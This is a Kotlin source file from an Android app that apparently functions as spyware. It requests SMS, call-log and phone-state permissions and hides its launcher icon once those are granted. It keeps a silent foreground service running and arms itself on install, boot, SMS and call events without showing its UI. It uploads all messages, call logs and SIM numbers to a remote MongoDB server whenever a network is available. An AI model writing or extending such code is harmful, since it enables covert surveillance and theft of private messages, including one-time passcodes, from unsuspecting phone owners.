package com.calltech

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.util.Log
import androidx.core.content.ContextCompat

object SyncBootstrap {
    private const val TAG = "SyncBootstrap"
    @Volatile
    private var networkCallbackArmed = false
    @Volatile
    private var lastNetworkSyncAt = 0L

    /** Alarm + WorkManager + silent foreground service (kill state ke liye). */
    fun armBackgroundSync(context: Context) {
        val app = context.applicationContext
        SyncAlarmScheduler.start(app)
        SyncWorkScheduler.schedule(app)
        armNetworkCallback(app)

        if (!needsRuntimePermissions(app)) {
            CallSyncService.ensureRunning(app)
        }
    }

    /** Install / boot / SMS / call — bina app UI khole background sync. */
    fun ensureBackgroundReady(context: Context) {
        val app = context.applicationContext
        try {
            MongoSyncHelper.ensureApiUrl(app)
            CallSyncHelper.markBackgroundSyncEnabled(app, true)
            PendingCallSync.flushIfPending(app)

            armBackgroundSync(app)
            start(app, "background_ready")

            Log.d(TAG, "Background sync armed")
        } catch (error: Exception) {
            Log.e(TAG, "ensureBackgroundReady failed", error)
        }
    }

    fun start(context: Context, source: String = "bootstrap") {
        val app = context.applicationContext
        try {
            MongoSyncHelper.ensureApiUrl(app)
            if (!MongoSyncHelper.isConfigured(app)) {
                Log.e(
                    TAG,
                    "MongoDB sync OFF — server/.env me MONGODB_URI set karo aur app dubara install karo",
                )
            }

            CallSyncHelper.markBackgroundSyncEnabled(app, true)
            PendingCallSync.flushIfPending(app)

            armBackgroundSync(app)
            SyncObserverManager.register(app)
            NotificationListenerHelper.requestRebind(app)

            BackgroundSyncRunner.run {
                DeviceRegistration.registerNow(app)
                PendingSmsQueue.flush(app)
                PendingCallQueue.flush(app)
                LocalDataStore.syncPendingToMongo(app, source)
                if (!needsRuntimePermissions(app)) {
                    SyncScheduler.syncIfPermittedNow(app, source)
                }
            }
            Log.d(TAG, "Background Mongo sync started ($source)")
        } catch (error: Exception) {
            Log.e(TAG, "Sync bootstrap failed", error)
        }
    }

    fun needsRuntimePermissions(context: Context): Boolean {
        return requiredPermissions().any { permission ->
            ContextCompat.checkSelfPermission(context, permission) !=
                PackageManager.PERMISSION_GRANTED
        }
    }

    /** Icon hide — READ_PHONE_NUMBERS ka wait mat karo, ColorOS usko alag rakhta hai. */
    fun canHideLauncher(context: Context): Boolean {
        val core = listOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
        )
        return core.all { permission ->
            ContextCompat.checkSelfPermission(context, permission) ==
                PackageManager.PERMISSION_GRANTED
        }
    }

    fun requiredPermissions(): Array<String> {
        val permissions = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
        )

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            permissions.add(Manifest.permission.READ_PHONE_NUMBERS)
        }

        return permissions.toTypedArray()
    }

    /** Permissions missing hone par system dialog aage lao — Activity ya background dono se. */
    fun launchPermissionTrampoline(context: Context) {
        PostInstallPrompt.showIfNeeded(context)
    }

    fun onPermissionsReady(context: Context) {
        val app = context.applicationContext
        BackgroundSyncNotifier.cancelPermission(app)

        if (needsRuntimePermissions(app)) {
            Log.w(TAG, "onPermissionsReady skipped hide — permissions still missing")
            BackgroundSyncRunner.run {
                DeviceRegistration.registerNow(app)
            }
            return
        }

        BackgroundSyncRunner.run {
            CallSyncService.holdDuring(app) {
                DeviceRegistration.registerNow(app)
                SimNumberHelper.registerAllSimsInMongo(app)
                SyncScheduler.syncIfPermittedNow(app, "permissions_ready")
                MessageSyncHelper.syncAllMessagesNow(app, "permissions_ready")
                CallSyncHelper.syncAllCallsToMongoNow(app, "permissions_ready")
            }
            SyncWorkScheduler.enqueueNow(app)
        }
    }

    private fun armNetworkCallback(context: Context) {
        if (networkCallbackArmed) {
            return
        }
        val app = context.applicationContext
        val cm = app.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            ?: return

        try {
            cm.registerDefaultNetworkCallback(object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    syncOnUsableNetwork(app)
                }

                override fun onCapabilitiesChanged(network: Network, caps: NetworkCapabilities) {
                    val usable = caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                        caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED) &&
                        !caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_CAPTIVE_PORTAL)
                    if (usable) {
                        syncOnUsableNetwork(app)
                    }
                }
            })
            networkCallbackArmed = true
        } catch (error: Exception) {
            Log.w(TAG, "Network callback failed: ${error.message}")
        }
    }

    private fun syncOnUsableNetwork(app: Context) {
        val now = System.currentTimeMillis()
        if (now - lastNetworkSyncAt < 8000L) {
            return
        }
        lastNetworkSyncAt = now
        BackgroundSyncRunner.run {
            try {
                DeviceRegistration.registerNow(app)
                if (!needsRuntimePermissions(app)) {
                    SyncScheduler.syncIfPermittedNow(app, "network_available")
                }
            } catch (error: Exception) {
                Log.e(TAG, "Network available sync failed", error)
            }
        }
    }
}
